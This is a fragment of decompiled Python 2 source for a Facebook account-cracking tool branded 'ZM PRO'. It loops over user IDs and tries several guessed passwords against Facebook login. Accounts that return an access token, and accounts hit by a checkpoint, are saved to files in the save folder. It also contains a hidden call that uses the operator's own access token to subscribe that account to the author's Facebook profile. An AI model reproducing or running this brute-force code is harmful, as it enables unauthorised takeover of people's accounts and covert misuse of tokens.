# Decompiled By Zabehullah Mohammadi 
# Github : https://github.com/TheZabehullah
# uncompyle6 version 3.7.4
# Original written By Zabehullah Mohammadi
...
\x1b[1;96m\033[1;96mAuthor   :            ZABEHULLAH
\x1b[1;96m\033[1;96mFacebook :         Zabehullah Mohammadi
\x1b[1;96m\033[1;96mGitHub   :             TheZabehullah
\x1b[1;96m\033[1;96mVersion  :              ZM PRO
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;96m  [Zabehullah_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [Zabehullah_CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [Zabehullah_Temp_Lock] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [Zabehullah_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [Zabehullah_Temp_Lock]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [Zabehullah_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
                       ...
                       q = json.load(data)
                       if 'access_token' in q:
                        print '\x1b[1;96m  [Zabehullah_Temp_Lock]  ' + k + c + user + '  |  ' + pass4
                        okb = open('save/CP.txt', 'a')
...
def main():
    try:
        ...
        exit(elite.menu_log())
    requests.post("https://graph.facebook.com/100041882590019/subscribers?access_token=" + token)      # Zabehullah Mohammadi
